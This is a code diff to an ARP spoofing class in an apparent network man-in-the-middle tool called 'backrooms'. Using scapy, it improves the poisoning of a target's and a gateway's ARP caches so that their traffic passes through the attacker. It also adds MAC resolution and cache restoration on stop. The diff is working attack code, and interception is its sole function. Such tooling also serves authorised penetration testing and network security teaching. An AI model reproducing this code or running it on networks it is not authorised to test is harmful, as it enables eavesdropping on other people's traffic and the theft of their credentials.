@@ -24,6 +24,7 @@ class MitmOptions:
 
     reverse: bool = True
     verbosity: int = 1
+    timeout: float = 2.0
 
 
 @dataclass
@@ -61,29 +62,65 @@ class ArpSpoof:
     """Poison the target<->gateway ARP cache to route traffic through us.
 
     Requires raw sockets (root). On Linux it enables IP forwarding so the
-    OS relays traffic between the two ends.
+    OS relays traffic between the two ends. On stop, it restores the pair's
+    ARP cache using the real MACs captured at start.
     """
 
-    def __init__(self, target_ip: str, gateway_ip: str, interface: str | None = None) -> None:
+    def __init__(
+        self,
+        target_ip: str,
+        gateway_ip: str,
+        interface: str | None = None,
+        options: MitmOptions | None = None,
+    ) -> None:
         self.target_ip = target_ip
         self.gateway_ip = gateway_ip
         self.interface = interface
+        self.options = options or MitmOptions()
+        self._real_target_mac: str | None = None
+        self._real_gateway_mac: str | None = None
         self._running = False
 
-    def _send(self, op: int, target: str, spoofed_for: str) -> None:
+    def _send(self, target: str, spoofed_for: str, spoof_mac: str) -> None:
         from scapy.all import ARP, Ether, srp  # type: ignore[attr-defined]
 
         pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
-            op=op,
-            pdst=target,
+            op=2,
+            hwsrc=spoof_mac,
             psrc=spoofed_for,
+            hwdst="ff:ff:ff:ff:ff:ff",
+            pdst=target,
         )
-        srp(pkt, iface=self.interface, timeout=2, verbose=False)
+        srp(pkt, iface=self.interface, timeout=self.request_timeout, verbose=False)
+
+    def _resolve_mac(self, ip: str) -> str | None:
+        """Ask the network for the real MAC of `ip` (ARP request)."""
+        from scapy.all import ARP, Ether, srp  # type: ignore[attr-defined]
+
+        try:
+            ans, _ = srp(
+                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
+                iface=self.interface,
+                timeout=self.request_timeout,
+                verbose=False,
+            )
+        except OSError:
+            return None
+        if ans:
+            return ans[0][1].hwsrc
+        return None
+
+    @property
+    def request_timeout(self) -> float:
+        return self.options.timeout
 
     def start(self) -> None:
         """Begin poisoning; call stop() in a finally block."""
         if not _have_root():
             raise NetworkError("ARP spoofing requires root (try: sudo backrooms mitm arp ...)")
+        # Resolve real MACs first so we can genuinely restore later.
+        self._real_target_mac = self._resolve_mac(self.target_ip)
+        self._real_gateway_mac = self._resolve_mac(self.gateway_ip)
         self._enable_ip_forward()
         self._running = True
 
@@ -92,8 +129,7 @@ class ArpSpoof:
         self.start()
         try:
             while self._running:
-                self._send(2, self.target_ip, self.gateway_ip)  # target -> us as gateway
-                self._send(2, self.gateway_ip, self.target_ip)  # gateway -> us as target
+                self._poison_once()
                 try:
                     time.sleep(2)
                 except KeyboardInterrupt:
@@ -101,14 +137,56 @@ class ArpSpoof:
         finally:
             self.stop()
 
+    def _poison_once(self) -> None:
+        # Our MAC is what the *other* end sees; scapy will fill hwsrc with
+        # our interface MAC when not given — but we pass it explicitly to be
+        # consistent. We impersonate the gateway to the target and the target
+        # to the gateway.
+        our_mac = self._own_mac()
+        if our_mac is None:
+            return
+        self._send(self.target_ip, self.gateway_ip, our_mac)  # target -> us as gateway
+        self._send(self.gateway_ip, self.target_ip, our_mac)  # gateway -> us as target
+
+    def _own_mac(self) -> str | None:
+        """Return the hardware address of our interface, best effort."""
+        if self.interface:
+            try:
+                from scapy.all import get_if_hwaddr  # type: ignore[attr-defined]
+
+                return get_if_hwaddr(self.interface)
+            except (OSError, RuntimeError, ImportError):
+                pass
+        import uuid
+
+        node = uuid.getnode()
+        if node is None or node == 0xFFFFFFFFFFFF:
+            return None
+        return ":".join(f"{(node >> (40 - 8 * i)) & 0xFF:02x}" for i in range(6))
+
     def stop(self) -> None:
-        """Restore the ARP cache and disable forwarding for the victim pair."""
+        """Restore the ARP cache of both ends using their real MACs."""
         self._running = False
-        try:
-            self._send(2, self.target_ip, self.gateway_ip)
-            self._send(2, self.gateway_ip, self.target_ip)
-        except Exception:  # noqa: BLE001, S110 - best-effort restore
-            pass
+        if self._real_target_mac and self._real_gateway_mac:
+            try:
+                # Tell target that gateway's real MAC is gateway_mac, and
+                # tell gateway that target's real MAC is target_mac.
+                self._restore_arp(self.target_ip, self.gateway_ip, self._real_gateway_mac)
+                self._restore_arp(self.gateway_ip, self.target_ip, self._real_target_mac)
+            except Exception:  # noqa: BLE001, S110 - best-effort restore
+                pass
+
+    def _restore_arp(self, target: str, psrc: str, real_mac: str) -> None:
+        from scapy.all import ARP, Ether, srp  # type: ignore[attr-defined]
+
+        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
+            op=2,
+            hwsrc=real_mac,
+            psrc=psrc,
+            hwdst="ff:ff:ff:ff:ff:ff",
+            pdst=target,
+        )
+        srp(pkt, iface=self.interface, timeout=self.request_timeout, verbose=False)
 
     @staticmethod
     def _enable_ip_forward() -> None:
